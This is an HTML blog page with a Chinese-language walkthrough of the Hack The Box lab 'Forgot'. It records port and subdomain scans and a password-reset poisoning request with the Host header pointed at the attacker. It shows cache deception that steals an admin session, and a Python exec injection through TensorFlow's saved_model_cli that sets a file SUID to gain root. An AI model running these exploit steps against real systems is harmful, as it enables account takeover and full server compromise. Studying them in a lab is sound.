@@ -1,0 +1,318 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>HTB:Forgot | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">HTB:Forgot</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2023-03-09</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://1dayluo.github.io/tag/5CW47rOjA1/">
+                    学习笔记
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/np12zpe3Rf/">
+                    靶场
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/Svnemmt1vn/">
+                    刷题
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/iAzsp2lm0F/">
+                    HTB
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h1 id="htbforgot">HTB：Forgot</h1>
+<h2 id="recon">Recon</h2>
+<p>端口扫描结果</p>
+<p>1.nmap扫描结果：</p>
+<pre><code class="language-shell">PORT   STATE SERVICE
+22/tcp open  ssh
+53/tcp open  domain
+80/tcp open  http
+</code></pre>
+<ol start="2">
+<li>rustscan扫描结果</li>
+</ol>
+<pre><code class="language-shell">PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+53/tcp open  domain  syn-ack
+80/tcp open  http    syn-ack
+</code></pre>
+<p>子域名扫描：</p>
+<p>wfuzz</p>
+<pre><code class="language-lua">000000108:   302        5 L      22 W       189 Ch      &quot;home&quot;                                                                                                                      
+000000550:   302        5 L      22 W       189 Ch      &quot;tickets&quot;                                                                                                                   
+000005034:   200        245 L    484 W      5189 Ch     &quot;login&quot;                                                                                                                     
+
+000023937:   503        14 L     28 W       283 Ch      &quot;darkeye&quot;                                                                                                                   
+000023938:   503        14 L     28 W       284 Ch      &quot;locblog&quot;                                                                                                                   
+000023933:   503        14 L     28 W       284 Ch      &quot;needlock&quot;                                                                                                                  
+000023936:   503        14 L     28 W       283 Ch      &quot;crs&quot;                                                                                                                       
+000023935:   503        14 L     28 W       283 Ch      &quot;krename&quot;                                                                                                                   
+000023932:   503        14 L     28 W       283 Ch      &quot;newsfighter&quot;                                                                                                               
+000023929:   503        14 L     28 W       283 Ch      &quot;using_libraries&quot;                                                                                                           
+000023931:   503        14 L     28 W       283 Ch      &quot;anonynews&quot;                                                                                                                 
+000023952:   503        14 L     28 W       284 Ch      &quot;oxine&quot;                                                                                                                     
+000023943:   503        14 L     28 W       284 Ch      &quot;im2html&quot;                                                                                                                   
+000023947:   503        14 L     28 W       283 Ch      &quot;1970_xeno&quot;                                                                                                                 
+000023950:   503        14 L     28 W       284 Ch      &quot;cowloop&quot;                                                                                                                   
+000023941:   503        14 L     28 W       283 Ch      &quot;sicons&quot;                                                                                                                    
+000023953:   503        14 L     28 W       283 Ch      &quot;mesa&quot;                                                                                                                      
+000023954:   503        14 L     28 W       284 Ch      &quot;blender&quot;                                                                                                                   
+000023956:   503        14 L     28 W       284 Ch      &quot;devil&quot;                                                                                                                     
+000023955:   503        14 L     28 W       284 Ch      &quot;cyberx3d-c&quot;                                                                                                                
+000023957:   503        14 L     28 W       284 Ch      &quot;freewrl&quot;                                                                                                                   
+000023961:   503        14 L     28 W       284 Ch      &quot;openvrml&quot;                                                                                                                  
+000023963:   503        14 L     28 W       283 Ch      &quot;vrml2pov&quot;                                                                                                                  
+000023958:   503        14 L     28 W       283 Ch      &quot;freewrlduneinputdevice&quot;                                                                                                    
+000023959:   503        14 L     28 W       284 Ch      &quot;libsball&quot;                                                                                                                  
+000023964:   503        14 L     28 W       284 Ch      &quot;wings3d&quot;                                                                                                                   
+000023965:   503        14 L     28 W       283 Ch      &quot;xigax&quot;                                                                                                                     
+000023966:   503        14 L     28 W       283 Ch      &quot;xj3d&quot;                                                                                                                      
+000023967:   503        14 L     28 W       283 Ch      &quot;blogpinger&quot;                                                                                                                
+000050631:   200        260 L    517 W      5523 Ch     &quot;reset&quot;                                                                                                                     
+000065584:   200        252 L    498 W      5227 Ch     &quot;forgot&quot;
+</code></pre>
+<p>技术框架</p>
+<ul>
+<li><code>werkzeug 2.1.2</code></li>
+<li><code>python3.8.10</code></li>
+</ul>
+<p>网站浏览，看源代码，看架构，看功能点。发现了注释</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/20230306.png" alt="20230306" loading="lazy"></figure>
+<h2 id="web探索-到拿到user-flag">Web探索 到拿到user flag</h2>
+<h3 id="password-reset-poisoning">Password reset poisoning</h3>
+<p>发送以下数据包（修改host地址）：</p>
+<pre><code>GET /forgot?username=robert-dev-1450212 HTTP/1.1
+Host: 你的host地址
+Upgrade-Insecure-Requests: 1
+DNT: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/.png),*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.11.188/forgot
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+sec-gpc: 1
+Connection: close
+</code></pre>
+<p>然后本地nc -lvp监听80</p>
+<h3 id="tickets-static-cache">/tickets - static cache</h3>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303061.png" alt="20230306" loading="lazy"></figure>
+<p>Varnish/6.2 是用于缓存一些静态资源的。并且历史也爆过存在缓存投毒的漏洞（cache poisoning） ，去查找被缓存的静态资源</p>
+<blockquote>
+<p>There will be some kind of rule, typically matching on the URL, to define what is cached and what is not. I’ll do some tests to see if I can figure out more about that rule.</p>
+</blockquote>
+<p>查找 <code>cache-control</code> 的header，那么为什么要看这个呢？不妨问问Notion AI</p>
+<p>问AI关于cache-control的内容如下：</p>
+<p><code>Cache-Control</code> 是HTTP协议中的一个用于控制缓存的header。通过设置不同的值，可以控制浏览器或代理服务器是否缓存响应，以及缓存多长时间等。而 <code>Age</code> 是HTTP协议中的一个响应头部，用于表示缓存对象在代理服务器或网关中存储的时间。它的值以秒为单位。</p>
+<p>一番确定后发现Varnish会去匹配string <code>/static</code> 进行缓存</p>
+<p>然后在 <code>/static</code> 下创建缓存目录后，发现cookie的部分被用到了缓存技术栈中</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303062.png" alt="20230306" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303063.png" alt="20230306" loading="lazy"></figure>
+<p>这个时候开个新的匿名模式浏览器，访问这个static下的资源，然后再访问 <code>/tickets</code> 是可以浏览到tickets页面的（但是并不应该浏览到）</p>
+<h3 id="admin_tickets">/admin_tickets</h3>
+<p><strong>发现有不能点的要看一下源代码</strong>，发现了链接：<a href="http://10.10.11.188/admin_tickets">http://10.10.11.188/admin_tickets</a></p>
+<p>点进去跳转 <a href="http://10.10.11.188/home?err=ACCESS_DENIED"><code>http://10.10.11.188/home?err=ACCESS_DENIED</code></a></p>
+<h3 id="钓鱼等待链接">钓鱼：等待链接</h3>
+<p>创建一个不存在的路径：</p>
+<ul>
+<li><a href="http://10.10.11.188/Admin_tickets/Static/Meow"><code>http://10.10.11.188/Admin_tickets/Static/Meow</code></a></li>
+</ul>
+<p>然后等管理员访问</p>
+<p>看见有session访问这个页面。（记得storage清session）</p>
+<p>然后看到了页面的auth .这块真的好坑，网页会自动大写首字母。所以看密码的话，还是看raw response的好。</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303064.png" alt="20230306" loading="lazy"></figure>
+<h2 id="esclation">Esclation</h2>
+<p><code>sudo -l</code> 看下权限</p>
+<pre><code>Matching Defaults entries for diego on forgot:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User diego may run the following commands on forgot:
+    (ALL) NOPASSWD: /opt/security/ml_security.py
+diego@forgot:~$
+</code></pre>
+<p>看了下py代码</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303065.png" alt="20230306" loading="lazy"></figure>
+<p>通过函数 <code>Xnew = getVec(data)</code> 分析网页特征，并且保存在 <code>Xnew</code> 这个变量里。然后再分别加载不同模型，用什么 <code>loaded_model</code>函数</p>
+<p>最后，根据特征数值计算，选择 <code>score</code> 大于0.5的，判断其为 不安全的：</p>
+<pre><code class="language-lua">preprocess_input_exprs_arg_string(data[i],safe=False)
+</code></pre>
+<p>这里用到了机器学习的库 <code>tensorflow.python.tools.saved_model_cli</code></p>
+<p><a href="https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-2841408">https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-2841408</a></p>
+<p>看github上commits的变更，发现了该函数有修改，默认safe为True：</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303066.png" alt="20230306" loading="lazy"></figure>
+<p>之前会直接执行 <code>expr</code></p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303067.png" alt="20230306" loading="lazy"></figure>
+<p>然后关于这里input的介绍：</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303068.png" alt="20230306" loading="lazy"></figure>
+<pre><code class="language-lua">input_key, expr = input_raw.split('=', 1) 
+</code></pre>
+<p>构造一个类似与 <code>input_key=&lt;python expression&gt;</code> 基于此基础修改POC,并且要保证其内部的触发xss检测</p>
+<pre><code class="language-lua">to=Admin&amp;link=/test&amp;reason=abc=exec(&quot;&quot;&quot;import os\nos.system(&quot;touch /tmp/114514&quot;)&quot;&quot;&quot;);#&lt;script&gt;alert(1)&lt;/script&gt;&amp;issue=Getting error while accessing search feature in enterprise platform.
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303069.png" alt="20230306" loading="lazy"></figure>
+<p>同时服务端运行 <code>sudo /opt/security/ml_security.py 2&gt;/dev/null</code></p>
+<p>然后发现了文件夹下有我们的 114514 这个文件，</p>
+<p>接着获取权限：这里的 <code>4777</code> 下的 <code>4</code> 代表 <code>Set UID</code> （可执行文件执行时，拥有文件所有者的权限。）</p>
+<pre><code>abc=exec(&quot;&quot;&quot;import os\nos.system(&quot;chmod 4
+.777 /tmp/114514&quot;)&quot;&quot;&quot;);#&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>运行：</p>
+<pre><code>diego@forgot:/tmp$ ./114514 -p
+</code></pre>
+<p>此时看id已经是root了</p>
+<h2 id="reference">Reference</h2>
+<ul>
+<li>https://0xdf.gitlab.io/2023/03/04/htb-forgot.html</li>
+</ul>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/xss-jin-jie-xue-xi-fen-xiang-yi/">
+              <h3 class="post-title">
+                下一篇：XSS进阶学习分享（一）
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
